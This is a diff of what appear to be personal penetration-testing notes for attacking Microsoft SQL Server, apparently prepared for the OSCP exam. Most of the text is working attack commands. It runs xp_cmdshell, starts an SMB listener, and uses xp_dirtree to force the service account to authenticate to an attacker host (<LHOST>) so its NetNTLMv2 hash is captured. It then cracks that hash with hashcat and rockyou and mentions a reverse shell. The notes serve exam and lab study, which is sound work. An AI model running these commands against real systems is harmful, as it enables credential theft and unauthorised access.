@@ -55,12 +55,13 @@ EXEC xp_cmdshell 'whoami';
 - [ ] A reverse shell from here: :Pb shells
 
 ## The service account's hash
-sudo responder -I tun0
+The non-poisoning SMB listener from :Pb responder:
+sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
 xp_dirtree \\<LHOST>\share
 Or in plain SQL:
 EXEC master..xp_dirtree '\\<LHOST>\share';
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
-- [ ] Not cracked: relay it to a host with signing:False instead
+- [ ] Not on the OSCP exam: relaying a captured response is kept out as a safe reading; OffSec's pages do not name relay
 
 ## SQL login hashes
 As sysadmin:
